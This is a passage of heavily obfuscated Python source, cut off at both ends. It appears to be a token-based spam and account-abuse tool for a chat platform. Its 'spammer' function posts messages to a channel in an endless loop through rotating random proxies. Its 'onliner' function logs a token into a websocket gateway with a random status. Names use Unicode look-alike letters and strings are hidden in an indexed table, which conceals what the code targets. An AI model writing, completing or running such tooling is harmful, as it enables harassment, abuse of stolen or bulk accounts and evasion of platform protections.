            𝘱𝗿𝙞𝗻𝘵(f"{𝘳}{𝘐𝘕𝙄𝗡𝗹𝗹𝘐𝘔𝗜𝙄𝙡𝘔𝘭𝙡𝙄𝙡𝙡𝙉𝗡𝗜𝙡𝘭𝘔𝙉𝗹𝗡𝘭𝘔𝘐𝘔𝘐𝙈[91]}{𝘥𝘢𝙩𝘦𝘵𝗶𝘮𝗲.datetime.now().strftime(f'{𝘨}{𝗜𝗡𝘐𝙉𝘭𝙡𝗜𝘔𝗜𝙄𝘭𝘔𝘭𝗹𝙄𝘭𝗹𝘕𝘕𝘐𝘭𝗹𝙈𝙉𝗹𝘕𝘭𝘔𝙄𝘔𝗜𝗠[92]}{𝙧}')}{𝙄𝙉𝙄𝘕𝗹𝘭𝘐𝗠𝘐𝘐𝗹𝗠𝗹𝘭𝘐𝘭𝘭𝗡𝗡𝙄𝗹𝙡𝗠𝗡𝙡𝗡𝙡𝙈𝘐𝘔𝘐𝗠[93]}{𝘳}{𝗜𝙉𝘐𝗡𝙡𝗹𝙄𝘔𝗜𝘐𝙡𝗠𝗹𝗹𝙄𝗹𝘭𝘕𝘕𝘐𝙡𝙡𝙈𝗡𝗹𝙉𝘭𝙈𝘐𝗠𝙄𝙈[91]}{𝗹𝘤}{𝘐𝙉𝗜𝗡𝗹𝗹𝘐𝘔𝙄𝘐𝗹𝗠𝙡𝘭𝘐𝙡𝙡𝗡𝗡𝗜𝘭𝗹𝘔𝙉𝗹𝘕𝘭𝘔𝗜𝘔𝙄𝘔[268]}{𝙧}{𝗜𝘕𝗜𝘕𝗹𝗹𝘐𝗠𝙄𝙄𝗹𝗠𝙡𝗹𝙄𝙡𝗹𝙉𝙉𝗜𝗹𝙡𝙈𝗡𝗹𝙉𝘭𝙈𝗜𝗠𝗜𝙈[93]}{𝘯𝙣}{𝙜}{𝗜𝘕𝙄𝗡𝘭𝗹𝘐𝗠𝘐𝙄𝘭𝘔𝗹𝗹𝗜𝗹𝗹𝙉𝙉𝘐𝘭𝘭𝗠𝗡𝗹𝘕𝘭𝗠𝗜𝙈𝗜𝗠[249]}")
        elif 𝙧𝙧.status_code == 403:
            𝘱𝘳𝙞𝗻𝘁(f"{𝙧}{𝘐𝘕𝘐𝙉𝘭𝘭𝗜𝘔𝙄𝘐𝘭𝙈𝗹𝙡𝙄𝙡𝗹𝗡𝘕𝗜𝘭𝙡𝙈𝘕𝗹𝗡𝙡𝘔𝗜𝗠𝘐𝗠[91]}{𝙙𝘢𝙩𝙚𝘵𝗶𝙢𝙚.datetime.now().strftime(f'{𝙜}{𝘐𝘕𝘐𝗡𝗹𝗹𝘐𝗠𝙄𝘐𝘭𝙈𝘭𝙡𝘐𝙡𝙡𝙉𝘕𝙄𝙡𝗹𝗠𝗡𝘭𝗡𝙡𝗠𝗜𝗠𝙄𝙈[92]}{𝘳}')}{𝗜𝘕𝙄𝙉𝘭𝙡𝙄𝙈𝗜𝙄𝗹𝗠𝗹𝙡𝘐𝙡𝘭𝙉𝙉𝗜𝘭𝗹𝗠𝗡𝙡𝘕𝗹𝗠𝘐𝙈𝙄𝘔[93]}{𝘳}{𝙄𝗡𝙄𝙉𝘭𝗹𝗜𝘔𝘐𝙄𝗹𝙈𝘭𝙡𝘐𝗹𝗹𝗡𝗡𝙄𝙡𝗹𝙈𝙉𝗹𝘕𝘭𝗠𝘐𝘔𝘐𝙈[91]}{𝗯}{𝘐𝗡𝘐𝙉𝘭𝘭𝘐𝘔𝗜𝗜𝘭𝙈𝗹𝗹𝙄𝙡𝘭𝗡𝙉𝗜𝙡𝘭𝙈𝘕𝗹𝘕𝗹𝙈𝘐𝙈𝘐𝗠[269]}{𝙧}{𝗜𝘕𝗜𝘕𝘭𝙡𝙄𝙈𝙄𝙄𝙡𝗠𝙡𝙡𝗜𝙡𝘭𝙉𝙉𝗜𝗹𝗹𝗠𝘕𝘭𝘕𝙡𝗠𝘐𝘔𝙄𝙈[93]}{𝙣𝘯}{𝘨}{𝗜𝘕𝙄𝗡𝗹𝗹𝙄𝗠𝗜𝙄𝙡𝗠𝗹𝘭𝘐𝙡𝗹𝗡𝘕𝗜𝗹𝘭𝘔𝗡𝙡𝙉𝙡𝗠𝗜𝘔𝗜𝗠[270]}{𝙧𝗿.text}")
            return
        else:
            𝘱𝘳𝘪𝙣𝘁(f"{𝗿}{𝙄𝘕𝙄𝗡𝗹𝗹𝙄𝘔𝗜𝙄𝙡𝗠𝘭𝘭𝘐𝙡𝙡𝗡𝙉𝗜𝙡𝗹𝗠𝙉𝙡𝙉𝗹𝗠𝘐𝗠𝘐𝗠[91]}{𝙙𝙖𝘁𝘦𝘵𝙞𝙢𝗲.datetime.now().strftime(f'{𝙜}{𝙄𝙉𝗜𝗡𝘭𝘭𝗜𝙈𝙄𝘐𝘭𝙈𝘭𝘭𝗜𝗹𝙡𝗡𝘕𝗜𝙡𝙡𝗠𝗡𝘭𝗡𝙡𝗠𝗜𝘔𝘐𝘔[92]}{𝙧}')}{𝙄𝘕𝘐𝘕𝗹𝗹𝙄𝗠𝘐𝘐𝙡𝘔𝗹𝗹𝙄𝗹𝘭𝙉𝙉𝙄𝗹𝙡𝗠𝙉𝙡𝙉𝗹𝗠𝙄𝗠𝙄𝗠[93]}{𝙧}{𝙄𝙉𝘐𝗡𝘭𝗹𝙄𝗠𝙄𝘐𝙡𝘔𝗹𝙡𝙄𝙡𝙡𝙉𝘕𝘐𝙡𝘭𝘔𝗡𝗹𝗡𝘭𝘔𝗜𝘔𝘐𝙈[91]}{𝗯}{𝘐𝘕𝘐𝗡𝗹𝘭𝙄𝙈𝙄𝙄𝙡𝘔𝙡𝗹𝗜𝙡𝙡𝗡𝗡𝗜𝙡𝗹𝗠𝙉𝙡𝗡𝙡𝘔𝙄𝘔𝗜𝙈[269]}{𝗿}{𝗜𝙉𝙄𝘕𝗹𝙡𝘐𝗠𝘐𝙄𝙡𝗠𝗹𝘭𝗜𝘭𝘭𝗡𝙉𝘐𝘭𝙡𝘔𝙉𝘭𝘕𝗹𝗠𝙄𝙈𝘐𝗠[93]}{𝘯𝘯}{𝘨}{𝙄𝗡𝙄𝘕𝗹𝗹𝘐𝙈𝙄𝗜𝗹𝗠𝘭𝘭𝘐𝗹𝘭𝙉𝘕𝘐𝙡𝗹𝙈𝘕𝙡𝗡𝘭𝙈𝘐𝙈𝗜𝘔[270]}{𝘳𝘳.text}")

def spammer(token, channel, message, delay):
    𝘩𝙚𝙖𝗱𝘦𝗿𝙨 = 𝙃𝘦𝙖𝙙𝗲𝗿𝘴(𝘁𝙤𝙠𝙚𝘯)
    while True:
        𝘥𝙣 = 𝙩𝘰𝙠𝘦𝗻.split(𝗜𝘕𝗜𝙉𝘭𝘭𝙄𝘔𝗜𝘐𝙡𝘔𝘭𝗹𝗜𝗹𝘭𝙉𝗡𝙄𝙡𝗹𝘔𝘕𝘭𝗡𝘭𝗠𝙄𝗠𝘐𝙈[247])
        𝙣𝘯 = 𝘥𝗻[0]
        𝘥𝗮𝘵𝘢 = {𝙄𝙉𝘐𝙉𝙡𝗹𝘐𝗠𝙄𝗜𝗹𝙈𝗹𝗹𝙄𝗹𝙡𝗡𝗡𝗜𝙡𝗹𝘔𝙉𝙡𝗡𝙡𝗠𝗜𝙈𝗜𝘔[265]: 𝘮𝘦𝙨𝙨𝗮𝙜𝗲}
        𝙨𝘭𝙚𝙚𝗽(𝗱𝙚𝗹𝙖𝘆)
        if 𝘱𝗿𝙤𝙭𝘺:
            𝗿𝙧 = 𝙧𝘦𝗾𝘂𝘦𝘀𝙩𝙨.post(f'{𝗜𝘕𝘐𝙉𝙡𝗹𝙄𝘔𝗜𝙄𝗹𝘔𝗹𝗹𝙄𝘭𝙡𝙉𝙉𝘐𝙡𝗹𝙈𝘕𝙡𝘕𝘭𝘔𝙄𝗠𝙄𝘔[266]}{𝘤𝘩𝙖𝘯𝙣𝗲𝘭}{𝙄𝘕𝗜𝙉𝘭𝙡𝘐𝙈𝙄𝘐𝗹𝘔𝙡𝗹𝙄𝘭𝘭𝘕𝙉𝙄𝘭𝙡𝗠𝙉𝘭𝙉𝙡𝘔𝘐𝘔𝘐𝗠[267]}', headers=𝘩𝗲𝘢𝘥𝘦𝗿𝘴, json=𝙙𝘢𝙩𝙖, proxy={𝘐𝘕𝘐𝗡𝗹𝘭𝗜𝘔𝘐𝘐𝙡𝘔𝘭𝙡𝘐𝗹𝙡𝗡𝗡𝙄𝘭𝙡𝙈𝙉𝙡𝙉𝗹𝗠𝗜𝘔𝘐𝘔[244]: 𝙄𝗡𝘐𝙉𝗹𝙡𝘐𝙈𝙄𝙄𝗹𝙈𝘭𝙡𝗜𝘭𝙡𝙉𝗡𝙄𝗹𝙡𝘔𝘕𝙡𝗡𝙡𝗠𝙄𝗠𝙄𝙈[246] + 𝘳𝘢𝘯𝙙𝘰𝘮.choice(𝘱𝘳𝗼𝘹𝙞𝗲𝘀), 𝘐𝗡𝘐𝘕𝙡𝘭𝘐𝙈𝘐𝘐𝗹𝘔𝘭𝗹𝙄𝘭𝙡𝙉𝗡𝙄𝗹𝗹𝘔𝗡𝘭𝘕𝗹𝘔𝘐𝘔𝗜𝘔[245]: 𝙄𝘕𝗜𝙉𝗹𝙡𝘐𝘔𝗜𝘐𝙡𝙈𝗹𝘭𝗜𝘭𝗹𝘕𝘕𝙄𝘭𝗹𝘔𝗡𝙡𝗡𝙡𝗠𝘐𝘔𝘐𝗠[246] + 𝘳𝗮𝗻𝗱𝙤𝘮.choice(𝙥𝙧𝘰𝙭𝙞𝘦𝙨)})
        else:
            𝘳𝘳 = 𝘳𝙚𝘲𝘶𝘦𝘴𝙩𝘀.post(f'{𝘐𝘕𝘐𝘕𝙡𝘭𝙄𝙈𝗜𝘐𝘭𝘔𝘭𝙡𝗜𝘭𝗹𝙉𝗡𝘐𝘭𝗹𝗠𝘕𝗹𝗡𝗹𝘔𝘐𝘔𝙄𝘔[266]}{𝗰𝙝𝘢𝗻𝙣𝘦𝘭}{𝙄𝗡𝙄𝗡𝙡𝘭𝘐𝙈𝗜𝙄𝙡𝘔𝗹𝘭𝘐𝘭𝘭𝙉𝗡𝘐𝙡𝘭𝙈𝙉𝙡𝙉𝘭𝘔𝘐𝙈𝗜𝗠[267]}', headers=𝗵𝗲𝗮𝘥𝗲𝙧𝘴, json=𝗱𝗮𝙩𝙖)
        if 𝙧𝗿.status_code == 200:
            𝘱𝘳𝗶𝘯𝙩(f"{𝗿}{𝗜𝗡𝗜𝘕𝘭𝗹𝘐𝘔𝗜𝘐𝗹𝗠𝘭𝙡𝗜𝙡𝗹𝗡𝙉𝙄𝗹𝙡𝘔𝗡𝘭𝗡𝘭𝗠𝗜𝗠𝙄𝘔[91]}{𝙙𝘢𝘵𝘦𝙩𝙞𝙢𝗲.datetime.now().strftime(f'{𝗴}{𝘐𝘕𝗜𝙉𝘭𝙡𝘐𝙈𝘐𝙄𝗹𝙈𝗹𝙡𝘐𝘭𝙡𝘕𝗡𝙄𝘭𝘭𝗠𝗡𝘭𝙉𝘭𝘔𝘐𝘔𝘐𝗠[92]}{𝗿}')}{𝗜𝗡𝘐𝗡𝘭𝗹𝙄𝘔𝗜𝗜𝗹𝙈𝙡𝘭𝗜𝘭𝗹𝙉𝙉𝗜𝗹𝙡𝘔𝗡𝙡𝗡𝗹𝘔𝗜𝙈𝘐𝙈[93]}{𝗿}{𝙄𝗡𝙄𝗡𝘭𝘭𝗜𝘔𝘐𝙄𝙡𝙈𝙡𝘭𝙄𝙡𝗹𝘕𝙉𝘐𝘭𝙡𝘔𝘕𝙡𝗡𝘭𝙈𝙄𝘔𝘐𝗠[91]}{𝗹𝙘}{𝗜𝗡𝗜𝙉𝘭𝙡𝙄𝗠𝘐𝙄𝙡𝙈𝘭𝙡𝙄𝗹𝘭𝙉𝗡𝗜𝙡𝘭𝘔𝙉𝘭𝙉𝗹𝗠𝘐𝘔𝗜𝘔[268]}{𝘳}{𝗜𝘕𝗜𝘕𝗹𝙡𝘐𝙈𝗜𝙄𝗹𝗠𝘭𝙡𝗜𝙡𝘭𝗡𝙉𝙄𝙡𝗹𝗠𝘕𝙡𝗡𝗹𝙈𝙄𝘔𝙄𝘔[93]}{𝗻𝘯}{𝙜}{𝙄𝗡𝘐𝗡𝘭𝘭𝙄𝗠𝗜𝙄𝗹𝘔𝙡𝗹𝘐𝘭𝙡𝙉𝗡𝘐𝙡𝗹𝙈𝗡𝗹𝗡𝘭𝘔𝘐𝘔𝗜𝗠[249]}")
        elif 𝘳𝗿.status_code == 403:
            𝗽𝘳𝘪𝘯𝙩(f"{𝙧}{𝘐𝗡𝗜𝘕𝗹𝗹𝗜𝗠𝗜𝘐𝗹𝙈𝗹𝘭𝙄𝙡𝙡𝙉𝗡𝙄𝘭𝙡𝙈𝘕𝘭𝙉𝘭𝗠𝗜𝘔𝗜𝘔[91]}{𝗱𝙖𝙩𝘦𝘁𝗶𝙢𝙚.datetime.now().strftime(f'{𝘨}{𝙄𝗡𝙄𝙉𝙡𝘭𝗜𝗠𝙄𝗜𝙡𝘔𝙡𝙡𝗜𝘭𝗹𝘕𝗡𝙄𝘭𝙡𝙈𝘕𝗹𝗡𝗹𝘔𝙄𝙈𝘐𝙈[92]}{𝙧}')}{𝘐𝙉𝙄𝗡𝘭𝘭𝙄𝗠𝘐𝘐𝘭𝘔𝗹𝗹𝗜𝙡𝗹𝙉𝘕𝗜𝙡𝘭𝗠𝘕𝘭𝘕𝙡𝙈𝘐𝗠𝙄𝗠[93]}{𝗿}{𝘐𝘕𝘐𝙉𝗹𝗹𝘐𝙈𝗜𝘐𝗹𝗠𝘭𝗹𝙄𝙡𝘭𝘕𝘕𝘐𝘭𝙡𝗠𝙉𝗹𝗡𝘭𝙈𝙄𝗠𝘐𝘔[91]}{𝗯}{𝗜𝗡𝗜𝙉𝗹𝗹𝘐𝘔𝙄𝙄𝙡𝙈𝗹𝘭𝘐𝗹𝙡𝗡𝗡𝘐𝗹𝙡𝘔𝙉𝙡𝘕𝗹𝘔𝙄𝙈𝙄𝘔[269]}{𝙧}{𝙄𝙉𝗜𝙉𝘭𝙡𝗜𝘔𝘐𝗜𝘭𝗠𝗹𝗹𝘐𝗹𝘭𝙉𝗡𝙄𝘭𝘭𝗠𝘕𝗹𝗡𝘭𝘔𝘐𝙈𝗜𝙈[93]}{𝘯𝗻}{𝗴}{𝘐𝗡𝗜𝙉𝙡𝘭𝗜𝘔𝘐𝙄𝘭𝙈𝘭𝗹𝘐𝘭𝙡𝘕𝗡𝙄𝗹𝙡𝘔𝗡𝙡𝙉𝘭𝙈𝘐𝘔𝗜𝗠[270]}{𝙧𝗿.text}")
            return
        else:
            𝗽𝘳𝙞𝙣𝙩(f"{𝘳}{𝘐𝙉𝙄𝙉𝘭𝘭𝙄𝘔𝘐𝙄𝗹𝘔𝘭𝙡𝘐𝗹𝙡𝗡𝙉𝘐𝗹𝘭𝗠𝗡𝗹𝙉𝘭𝗠𝗜𝘔𝙄𝗠[91]}{𝗱𝘢𝘁𝙚𝘁𝗶𝗺𝙚.datetime.now().strftime(f'{𝙜}{𝙄𝗡𝗜𝗡𝗹𝘭𝗜𝘔𝘐𝙄𝘭𝘔𝙡𝙡𝘐𝙡𝗹𝘕𝙉𝗜𝘭𝙡𝗠𝗡𝙡𝗡𝗹𝙈𝘐𝗠𝗜𝘔[92]}{𝘳}')}{𝙄𝗡𝗜𝘕𝙡𝘭𝘐𝘔𝙄𝘐𝘭𝗠𝘭𝙡𝘐𝙡𝘭𝗡𝗡𝙄𝗹𝘭𝘔𝙉𝙡𝗡𝘭𝘔𝘐𝗠𝘐𝘔[93]}{𝘳}{𝗜𝙉𝘐𝙉𝗹𝙡𝗜𝙈𝗜𝘐𝙡𝘔𝙡𝘭𝙄𝗹𝘭𝗡𝙉𝗜𝗹𝘭𝙈𝘕𝙡𝗡𝗹𝗠𝗜𝘔𝘐𝘔[91]}{𝗯}{𝙄𝘕𝙄𝙉𝗹𝙡𝙄𝘔𝘐𝘐𝗹𝗠𝙡𝙡𝙄𝘭𝗹𝘕𝗡𝙄𝗹𝘭𝙈𝗡𝗹𝘕𝙡𝙈𝘐𝗠𝗜𝗠[269]}{𝙧}{𝙄𝗡𝙄𝘕𝗹𝗹𝘐𝘔𝙄𝘐𝗹𝙈𝗹𝘭𝘐𝙡𝙡𝙉𝗡𝙄𝘭𝗹𝗠𝘕𝗹𝙉𝙡𝘔𝘐𝗠𝙄𝘔[93]}{𝗻𝗻}{𝙜}{𝙄𝘕𝗜𝘕𝗹𝙡𝘐𝗠𝙄𝘐𝘭𝘔𝙡𝗹𝗜𝙡𝗹𝙉𝗡𝙄𝗹𝘭𝗠𝗡𝘭𝘕𝗹𝗠𝙄𝗠𝘐𝙈[270]}{𝗿𝘳.text}{𝙄𝙉𝗜𝗡𝗹𝙡𝘐𝙈𝗜𝙄𝗹𝙈𝘭𝙡𝙄𝘭𝗹𝙉𝗡𝗜𝗹𝘭𝙈𝗡𝙡𝘕𝗹𝗠𝗜𝗠𝗜𝘔[98]}{𝗿𝗿.status_code}")

def onliner(token):
    𝘀𝘵𝗮𝘁𝘂𝘀 = [𝙄𝙉𝙄𝗡𝘭𝘭𝙄𝗠𝗜𝙄𝙡𝘔𝙡𝙡𝘐𝙡𝙡𝗡𝘕𝙄𝙡𝘭𝘔𝗡𝙡𝗡𝘭𝘔𝙄𝙈𝙄𝘔[271], 𝗜𝗡𝘐𝗡𝘭𝗹𝗜𝘔𝙄𝘐𝙡𝘔𝗹𝗹𝘐𝘭𝘭𝗡𝗡𝗜𝙡𝘭𝗠𝗡𝙡𝙉𝘭𝗠𝘐𝙈𝙄𝙈[272], 𝗜𝗡𝙄𝘕𝙡𝘭𝙄𝘔𝙄𝗜𝙡𝙈𝙡𝙡𝙄𝗹𝙡𝗡𝗡𝙄𝙡𝗹𝘔𝙉𝘭𝗡𝙡𝗠𝙄𝘔𝘐𝘔[273]]
    𝙬𝘴 = 𝘄𝘦𝘣𝘀𝘰𝙘𝙠𝙚𝙩.WebSocket()
    𝙬𝘴.connect(𝙄𝙉𝘐𝘕𝘭𝙡𝘐𝙈𝙄𝗜𝗹𝙈𝗹𝗹𝘐𝗹𝘭𝘕𝘕𝙄𝙡𝘭𝙈𝗡𝙡𝗡𝘭𝘔𝗜𝘔𝗜𝗠[274])
    𝙧𝗿 = 𝘸𝙨.recv()
    𝘦𝙫𝗲𝗻𝘁 = 𝙟𝘀𝙤𝗻.loads(𝘳𝙧)
    𝙝𝗲𝙖𝗿𝘵𝙗𝘦𝘢𝙩_𝘪𝙣𝘵𝙚𝘳𝘃𝗮𝗹 = 𝗲𝙫𝗲𝙣𝘁[𝙄𝗡𝘐𝘕𝗹𝙡𝘐𝙈𝗜𝙄𝗹𝗠𝙡𝗹𝙄𝗹𝘭𝘕𝘕𝙄𝗹𝙡𝘔𝙉𝘭𝗡𝗹𝙈𝗜𝘔𝘐𝘔[166]][𝙄𝘕𝘐𝘕𝗹𝗹𝘐𝗠𝘐𝘐𝘭𝙈𝙡𝙡𝙄𝘭𝗹𝙉𝙉𝗜𝗹𝘭𝙈𝘕𝘭𝙉𝘭𝙈𝘐𝗠𝙄𝗠[199]] / 1000
    𝗮𝙪𝘁𝙝 = {𝘐𝘕𝘐𝘕𝗹𝙡𝘐𝙈𝙄𝘐𝙡𝘔𝘭𝙡𝙄𝙡𝘭𝘕𝘕𝗜𝘭𝘭𝙈𝗡𝘭𝗡𝗹𝗠𝗜𝘔𝙄𝗠[169]: 2, 𝗜𝗡𝘐𝘕𝗹𝘭𝗜𝙈𝙄𝘐𝗹𝙈𝗹𝙡𝗜𝙡𝘭𝙉𝙉𝗜𝙡𝘭𝗠𝗡𝗹𝘕𝙡𝗠𝙄𝗠𝗜𝘔[166]: {𝙄𝗡𝙄𝗡𝘭𝗹𝘐𝘔𝙄𝙄𝙡𝗠𝘭𝘭𝗜𝗹𝙡𝘕𝙉𝘐𝗹𝗹𝘔𝗡𝙡𝙉𝘭𝗠𝙄𝙈𝗜𝘔[253]: 𝘵𝘰𝗸𝗲𝘯, 𝙄𝙉𝗜𝙉𝙡𝙡𝗜𝘔𝙄𝘐𝘭𝘔𝗹𝙡𝘐𝙡𝘭𝗡𝙉𝙄𝘭𝘭𝘔𝗡𝙡𝗡𝙡𝙈𝙄𝗠𝗜𝙈[275]: 61, 𝗜𝙉𝘐𝙉𝘭𝙡𝗜𝙈𝘐𝘐𝙡𝘔𝗹𝗹𝙄𝗹𝙡𝙉𝘕𝗜𝘭𝙡𝙈𝘕𝙡𝘕𝙡𝗠𝗜𝘔𝙄𝗠[254]: {𝗜𝙉𝙄𝘕𝘭𝗹𝘐𝗠𝗜𝗜𝗹𝗠𝙡𝙡𝘐𝗹𝘭𝗡𝙉𝗜𝗹𝙡𝗠𝗡𝙡𝗡𝘭𝙈𝗜𝙈𝘐𝗠[106]: 𝙄𝗡𝙄𝘕𝘭𝘭𝘐𝙈𝘐𝗜𝙡𝗠𝗹𝙡𝙄𝘭𝙡𝙉𝘕𝗜𝗹𝗹𝙈𝘕𝙡𝙉𝙡𝗠𝘐𝗠𝗜𝘔[118], 𝗜𝗡𝗜𝗡𝙡𝗹𝘐𝙈𝘐𝙄𝘭𝙈𝙡𝗹𝘐𝗹𝙡𝙉𝘕𝘐𝗹𝙡𝘔𝘕𝘭𝗡𝙡𝗠𝘐𝙈𝗜𝙈[107]: 𝘐𝗡𝘐𝗡𝙡𝗹𝗜𝘔𝘐𝗜𝙡𝗠𝙡𝘭𝗜𝘭𝘭𝗡𝙉𝗜𝘭𝘭𝙈𝘕𝙡𝘕𝙡𝗠𝙄𝗠𝙄𝘔[284], 𝗜𝙉𝗜𝗡𝗹𝘭𝗜𝗠𝘐𝙄𝗹𝘔𝘭𝙡𝙄𝙡𝗹𝗡𝗡𝙄𝙡𝗹𝙈𝙉𝘭𝗡𝗹𝗠𝘐𝘔𝗜𝘔[279]: 𝘐𝙉𝘐𝘕𝗹𝗹𝗜𝗠𝘐𝙄𝙡𝗠𝘭𝙡𝗜𝗹𝗹𝗡𝙉𝘐𝘭𝘭𝙈𝙉𝗹𝗡𝘭𝙈𝗜𝗠𝘐𝗠[22], 𝙄𝗡𝙄𝗡𝘭𝘭𝘐𝙈𝗜𝘐𝙡𝘔𝗹𝗹𝙄𝗹𝙡𝗡𝗡𝘐𝙡𝙡𝘔𝗡𝗹𝘕𝗹𝘔𝙄𝗠𝙄𝘔[112]: 𝘐𝘕𝗜𝙉𝙡𝘭𝘐𝗠𝘐𝙄𝙡𝙈𝘭𝙡𝘐𝙡𝙡𝙉𝗡𝙄𝗹𝘭𝗠𝙉𝗹𝙉𝘭𝗠𝙄𝗠𝘐𝗠[285], 𝙄𝙉𝙄𝙉𝙡𝗹𝗜𝘔𝗜𝘐𝘭𝗠𝙡𝙡𝗜𝘭𝗹𝘕𝘕𝙄𝘭𝗹𝙈𝗡𝘭𝙉𝙡𝘔𝙄𝙈𝘐𝙈[113]: 𝘐𝘕𝗜𝘕𝘭𝙡𝗜𝙈𝘐𝗜𝗹𝗠𝗹𝙡𝗜𝘭𝙡𝘕𝗡𝘐𝘭𝙡𝗠𝗡𝗹𝙉𝗹𝗠𝙄𝗠𝘐𝘔[286], 𝘐𝘕𝘐𝙉𝙡𝗹𝙄𝗠𝙄𝗜𝘭𝘔𝘭𝘭𝘐𝙡𝘭𝗡𝘕𝙄𝙡𝗹𝘔𝘕𝙡𝘕𝘭𝘔𝘐𝘔𝙄𝘔[114]: 𝘐𝘕𝙄𝗡𝙡𝙡𝘐𝗠𝙄𝗜𝗹𝗠𝘭𝗹𝘐𝗹𝙡𝙉𝗡𝗜𝗹𝙡𝘔𝙉𝗹𝙉𝗹𝘔𝙄𝗠𝘐𝘔[287], 𝗜𝗡𝘐𝙉𝗹𝙡𝗜𝗠𝗜𝗜𝙡𝘔𝗹𝙡𝘐𝙡𝙡𝘕𝗡𝗜𝗹𝗹𝘔𝗡𝗹𝗡𝗹𝘔𝙄𝘔𝗜𝙈[110]: 𝙄𝙉𝘐𝙉𝘭𝗹𝙄𝙈𝘐𝙄𝙡𝙈𝗹𝗹𝙄𝗹𝗹𝙉𝙉𝘐𝘭𝗹𝙈𝗡𝗹𝙉𝘭𝘔𝙄𝘔𝗜𝙈[288], 𝘐𝗡𝙄𝙉𝗹𝘭𝙄𝘔𝘐𝘐𝗹𝘔𝙡𝙡𝘐𝗹𝙡𝙉𝗡𝘐𝗹𝙡𝘔𝗡𝗹𝗡𝗹𝘔𝗜𝘔𝘐𝗠[280]: 𝗜𝘕𝗜𝗡𝗹𝙡𝙄𝘔𝗜𝘐𝘭𝙈𝘭𝘭𝗜𝘭𝗹𝘕𝙉𝘐𝙡𝗹𝙈𝗡𝙡𝗡𝗹𝙈𝗜𝗠𝗜𝙈[22], 𝗜𝗡𝘐𝘕𝘭𝙡𝘐𝘔𝘐𝙄𝗹𝗠𝘭𝙡𝗜𝗹𝙡𝘕𝘕𝗜𝙡𝘭𝘔𝗡𝗹𝘕𝘭𝗠𝙄𝘔𝙄𝘔[281]: 𝗜𝘕𝗜𝙉𝙡𝘭𝗜𝙈𝗜𝗜𝗹𝘔𝘭𝗹𝘐𝗹𝘭𝙉𝗡𝗜𝙡𝙡𝙈𝙉𝙡𝙉𝘭𝘔𝙄𝘔𝙄𝗠[22], 𝘐𝗡𝘐𝘕𝗹𝗹𝘐𝘔𝘐𝙄𝙡𝘔𝘭𝙡𝘐𝘭𝗹𝙉𝗡𝙄𝘭𝘭𝙈𝘕𝙡𝗡𝘭𝗠𝗜𝗠𝙄𝗠[282]: 𝙄𝘕𝗜𝙉𝘭𝙡𝙄𝘔𝙄𝙄𝙡𝙈𝗹𝙡𝘐𝘭𝙡𝗡𝙉𝗜𝘭𝘭𝗠𝘕𝙡𝘕𝗹𝗠𝘐𝙈𝗜𝗠[22], 𝙄𝘕𝙄𝗡𝙡𝗹𝗜𝗠𝗜𝘐𝘭𝗠𝙡𝘭𝘐𝘭𝗹𝙉𝘕𝗜𝘭𝘭𝙈𝘕𝗹𝗡𝘭𝗠𝙄𝗠𝗜𝙈[283]: 𝗜𝗡𝙄𝘕𝙡𝗹𝗜𝘔𝙄𝘐𝘭𝘔𝘭𝗹𝙄𝗹𝘭𝙉𝗡𝙄𝗹𝙡𝙈𝘕𝙡𝗡𝙡𝙈𝗜𝘔𝗜𝗠[22], 𝘐𝘕𝘐𝗡𝗹𝙡𝗜𝙈𝘐𝗜𝗹𝗠𝙡𝗹𝘐𝗹𝘭𝗡𝘕𝗜𝘭𝗹𝗠𝗡𝘭𝗡𝘭𝗠𝗜𝘔𝗜𝙈[108]: 𝗜𝙉𝘐𝙉𝗹𝘭𝗜𝘔𝙄𝗜𝙡𝗠𝗹𝗹𝘐𝘭𝘭𝗡𝙉𝙄𝗹𝗹𝙈𝙉𝗹𝘕𝗹𝗠𝘐𝙈𝗜𝘔[120], 𝗜𝙉𝙄𝗡𝘭𝗹𝗜𝘔𝗜𝘐𝙡𝙈𝗹𝘭𝙄𝙡𝙡𝙉𝗡𝙄𝗹𝙡𝗠𝗡𝙡𝘕𝘭𝗠𝘐𝘔𝙄𝘔[115]: 𝙄𝘕𝙄𝘕𝘭𝘭𝙄𝗠𝗜𝗜𝗹𝘔𝘭𝗹𝙄𝙡𝘭𝙉𝙉𝙄𝗹𝗹𝗠𝙉𝘭𝙉𝗹𝗠𝙄𝙈𝗜𝘔[289], 𝙄𝗡𝗜𝗡𝙡𝙡𝙄𝗠𝘐𝗜𝗹𝗠𝘭𝗹𝙄𝘭𝙡𝗡𝘕𝘐𝗹𝘭𝗠𝙉𝗹𝘕𝘭𝙈𝘐𝗠𝗜𝙈[117]: 𝗜𝘕𝘐𝗡𝙡𝙡𝙄𝙈𝙄𝗜𝙡𝗠𝘭𝘭𝙄𝘭𝗹𝙉𝙉𝗜𝘭𝘭𝘔𝙉𝘭𝘕𝗹𝗠𝗜𝘔𝗜𝗠[290]}, 𝗜𝘕𝘐𝘕𝘭𝗹𝘐𝗠𝙄𝗜𝘭𝙈𝗹𝙡𝗜𝗹𝗹𝘕𝘕𝙄𝗹𝘭𝘔𝗡𝗹𝗡𝘭𝗠𝙄𝗠𝗜𝗠[276]: {𝘐𝗡𝗜𝗡𝘭𝗹𝙄𝙈𝗜𝗜𝘭𝗠𝘭𝗹𝗜𝘭𝗹𝗡𝗡𝗜𝗹𝙡𝘔𝘕𝘭𝗡𝙡𝙈𝙄𝘔𝗜𝗠[291]: 𝘳𝗮𝘯𝙙𝗼𝗺.choice(𝘴𝙩𝙖𝙩𝘂𝙨), 𝗜𝘕𝗜𝘕𝘭𝘭𝙄𝙈𝙄𝗜𝙡𝗠𝗹𝗹𝗜𝘭𝙡𝘕𝙉𝘐𝘭𝙡𝘔𝙉𝗹𝘕𝙡𝙈𝙄𝗠𝗜𝗠[292]: 0, 𝙄𝙉𝗜𝘕𝘭𝗹𝙄𝘔𝘐𝘐𝙡𝙈𝙡𝗹𝗜𝗹𝙡𝗡𝗡𝗜𝙡𝘭𝘔𝘕𝘭𝗡𝘭𝙈𝘐𝙈𝙄𝘔[293]: [], 𝙄𝘕𝙄𝙉𝘭𝘭𝘐𝘔𝘐𝗜𝘭𝗠𝗹𝙡𝙄𝙡𝙡𝘕𝘕𝗜𝙡𝙡𝗠𝗡𝗹𝙉𝙡𝘔𝗜𝙈𝗜𝗠[294]: False}, 𝘐𝘕𝗜𝗡𝙡𝙡𝙄𝘔𝘐𝗜𝘭𝙈𝘭𝘭𝗜𝙡𝗹𝙉𝗡𝘐𝗹𝘭𝗠𝘕𝘭𝙉𝗹𝗠𝙄𝗠𝘐𝗠[277]: False, 